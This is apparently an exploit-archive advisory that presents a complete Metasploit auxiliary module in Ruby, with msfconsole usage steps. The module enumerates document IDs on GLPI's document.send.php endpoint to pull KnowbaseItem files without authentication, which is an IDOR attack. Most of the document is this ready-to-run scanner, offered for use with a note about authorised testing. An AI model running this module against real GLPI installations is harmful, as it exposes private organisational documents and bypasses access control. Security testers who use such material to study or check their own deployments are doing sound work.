@@ -1,0 +1,131 @@
+=============================================================================================================================================
+| # Title     : GLPI Accessible Documents IDOR Scanner – Metasploit Auxiliary Module                                                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.glpi-project.org/en/                                                                                            |
+=============================================================================================================================================
+
+[+] Summary    :  This Metasploit auxiliary module scans a GLPI installation for improperly exposed documents linked to KnowbaseItem objects via the document.send.php endpoint.
+                  The module performs an automated enumeration of docid values within a defined range and attempts to access documents without authentication. 
+				  If the server responds with HTTP 200 and a non-HTML content type (e.g., PDF, image, ZIP, etc.), the module flags it as a potential Insecure Direct Object Reference (IDOR) vulnerability.
+
+[+] The scanner:
+
+Iterates over a configurable docid range
+
+Targets KnowbaseItem document associations
+
+Validates responses based on allowed content types
+
+Reports accessible documents that may indicate improper access control
+
+This module is intended for authorized security testing to identify access control misconfigurations in GLPI deployments.
+
+[+] POC : 
+
+modules/auxiliary/scanner/http/glpi_doc_idor.rb
+
+msfconsole
+msf > reload_all
+
+use auxiliary/scanner/http/glpi_doc_idor
+set RHOST 10.0.0.1
+set RPORT 80
+set TARGETURI /
+set ITEMS_ID 123
+set DOCID_START 1
+set DOCID_END 100
+run
+
+
+
+##
+# This module requires Metasploit Framework
+# Tested with Metasploit 6.x
+##
+
+require 'msf/core'
+require 'uri'
+require 'net/http'
+
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'GLPI Accessible Documents IDOR Scanner',
+      'Description'    => %q{
+        Scans a GLPI installation for accessible KnowbaseItem documents without authentication.
+        This checks for possible IDOR vulnerabilities by iterating docid values.
+      },
+      'Author'         => ['Indoushka'],
+      'License'        => MSF_LICENSE
+    ))
+
+    register_options(
+      [
+        Opt::RHOST(),
+        Opt::RPORT(80),
+        OptString.new('TARGETURI', [true, "Base path of GLPI", '/']),
+        OptInt.new('ITEMS_ID', [true, "Items ID to test", 1]),
+        OptInt.new('DOCID_START', [true, "Starting docid", 1]),
+        OptInt.new('DOCID_END', [true, "Ending docid", 100])
+      ]
+    )
+
+    register_advanced_options(
+      [
+        OptBool.new('SSL', [true, "Use SSL", false])
+      ]
+    )
+  end
+
+  def check_content_type(resp)
+    return false if resp.nil? || resp['Content-Type'].nil?
+    ct = resp['Content-Type'].downcase
+    allowed = ["image/", "application/pdf", "application/xml", "text/xml", "text/csv",
+               "application/zip", "application/x-rar-compressed", "application/x-gzip",
+               "audio/", "video/", "application/postscript", "image/svg+xml",
+               "application/x-shockwave-flash", "application/x-tar", "application/x-bzip2",
+               "application/x-7z-compressed", "application/vnd.ms-excel", "application/msword"]
+    allowed.any? { |sub| ct.include?(sub) } && !ct.include?("text/html")
+  end
+
+  def run
+    start_id = datastore['DOCID_START']
+    end_id   = datastore['DOCID_END']
+    items_id = datastore['ITEMS_ID']
+    base_uri = normalize_uri(datastore['TARGETURI'])
+    use_ssl = datastore['SSL']
+
+    (start_id..end_id).each do |docid|
+      target_url = "#{base_uri}/front/document.send.php?docid=#{docid}&itemtype=KnowbaseItem&items_id=#{items_id}"
+
+      begin
+        res = send_request_cgi({
+          'uri'     => target_url,
+          'method'  => 'GET',
+          'headers' => {
+            'User-Agent' => 'Mozilla/5.0 (compatible; GLPI-Doc-Checker/1.1)'
+          }
+        })
+
+        next if res.nil?
+
+        if res.code == 200 && check_content_type(res)
+          print_good("#{rhost}:#{rport}#{target_url} -> #{res['Content-Type']} - vulnerability found")
+        elsif framework.debug?
+          print_status("Skipped #{target_url} -> #{res.code} -> #{res['Content-Type']}")
+        end
+
+      rescue ::Rex::ConnectionError => e
+        print_error("Connection error: #{e}")
+      end
+    end
+  end
+end
+
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
